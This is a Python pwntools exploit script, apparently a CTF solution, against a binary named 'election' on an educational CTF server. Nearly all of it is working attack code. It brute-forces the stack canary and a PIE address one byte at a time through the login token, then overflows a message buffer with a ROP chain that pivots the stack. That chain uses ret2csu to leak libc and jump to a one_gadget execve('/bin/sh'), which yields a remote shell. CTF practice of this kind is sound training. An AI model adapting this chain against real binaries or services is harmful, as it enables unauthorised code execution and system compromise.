from pwn import *

context(arch='amd64', os='linux', log_level='debug')

e = ELF('election')
libc = ELF('libc.so')

pop_rdi = 0x00000000000011a3
pop_rbp = 0x0000000000000a40
pop_rsi_r15 = 0x00000000000011a1
leave = 0x0000000000000be9
ret = 0x0000000000000906
jmp_rsp = 0x000000000000145f
pop_rbx_rbp_r12_r13_r14_r15 = 0x119a
csu_gadget = 0x1180

#  r = remote('localhost', 1111)
r = remote('edu-ctf.csie.org', 10180)

def login(token):
    r.sendafter('>\n', '1')
    r.sendafter('Token: ', token)

def register(token):
    r.sendafter('>\n', '2')
    r.sendafter('Register an anonymous token: ', token)

def quit():
    r.sendafter('>\n', '3')

def vote(who):
    r.sendafter('>\n', '1')
    r.sendafter('Your choice [0~9]: ', who)

def say(who, msg):
    r.sendafter('>\n', '2')
    r.sendafter('To [0~9]: ', who)
    r.sendafter('Message: ', msg)

def logout():
    r.sendafter('>\n', '3')


# leak canary and &__lib_csu_init by brute-forcing token
# bypass PIE, canary
junk = b'a'*0xb8
register(junk)

arr = bytearray(24)
for i in range(16):
    for byte in range(256):
        login(junk + arr[:i] + byte.to_bytes(1, 'little'))
        r.recvuntil('\n1. ')
        if r.recv(1) == b'V': # Vote
            arr[i] = byte
            logout()
            break

canary = u64(arr[:8])
csu    = u64(arr[8:16])

bss = csu - 0x000055deaa597140 + 0x55deaa798000
text = bss - 0x202000

success('canary='+hex(canary))
success('bss='+hex(bss))


# vote as many as possible (255)
for i in range(26):
    register(str(i))
    login(str(i))

    for j in range(10):
        if i == 25 and j == 5:
            break
        vote('0')

    logout()


# leak libc base
# say something to overflow
# ROP chain + stack pivoting
buf_addr = bss + 0x160
buf = flat( # len(buf) <= 0xb8

    # puts(puts@got)
    text + pop_rdi,
    bss - 0x70, # puts@got
    text + 0x940, # puts@plt

    # rdi = 0
    text + pop_rdi,
    0,

    # read(0, bss, 8)
    text + pop_rbx_rbp_r12_r13_r14_r15,
    0, # rbx
    1, # rbp
    bss - 0x50, # r12 = function = read@got
    0, # r13d = edi
    bss, # r14 = rsi
    8, # r15 = rdx
    text + csu_gadget,

    # (*bss)(bss+8)
    0xdeafbeef, # padding for add esp, 8
    0, # rbx
    1, # rbp
    bss, # r12 = function
    0x1313, # r13d = edi
    0x1414, # r14 = rsi
    0x1515, # r15 = rdx
    text + csu_gadget,
)
register(buf)
login(buf)
say('0', flat(
    b'a'*0xe8, canary,
    buf_addr - 8, text + leave)[:0xff]) # stack pivoting
logout()

libcbase = u64(r.recv(6) + b'\0\0') - 0x00007f059a5fc9c0 + 0x7f059a57c000
success('libc='+hex(libcbase))

r.send(p64(libcbase + 0x4f322))

r.interactive()

#  0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
#  constraints:
#    rsp & 0xf == 0
#    rcx == NULL

#  0x4f322 execve("/bin/sh", rsp+0x40, environ)
#  constraints:
#    [rsp+0x40] == NULL

#  0x10a38c execve("/bin/sh", rsp+0x70, environ)
#  constraints:
#    [rsp+0x70] == NULL


